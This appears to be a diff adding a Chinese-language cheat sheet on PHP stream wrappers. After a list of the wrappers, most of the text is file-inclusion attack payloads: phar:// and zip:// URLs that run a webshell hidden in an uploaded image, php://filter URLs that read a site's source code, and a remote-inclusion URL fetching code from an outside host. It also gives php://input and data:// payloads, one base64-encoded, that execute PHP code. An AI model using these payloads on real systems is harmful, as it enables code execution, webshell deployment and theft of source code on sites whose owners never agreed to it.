@@ -1,0 +1,33 @@
+PHP伪协议
+ 
+php伪协议：
+file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+利用zip或phar伪协议读取压缩包中的文件
+/about.php?f=phar://./images/1499394959.jpg/1.php
+/about.php?f=zip://./images/1499394959.jpg%231.php    
+上传webshell完成
+读取页面源代码
+/about.php?f=php://filter/convert.base64-encode/resource=index.php
+以base64加密的形式读取页面源代码，然后在再对代码进行base64解密就可以得到源代码
+
+当php配置allow_url_include和allow_url_fopen都为On的时候，可以对文件进行远程包含
+例如:about.php?f=http://web/1.php
+当allow_url_include为On，而allow_url_fopen为Off的是否，不可以直接远程包含文件，但是可以使用php://input、 php://stdin、 php://memory 和 php://temp等伪协议
+例如about.php?f=php://input  post传输数据<?php phpinfo(); ?>
+PHP 读文件和代码执行的方式：
+1.?file=data:text/plain,<?php phpinfo()?>
+2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+3.?file=php://input [POST DATA:]<?php phpinfo()?>
+4.?file=php://filter/read=convert.base64-encode/resource=xxx.php
+
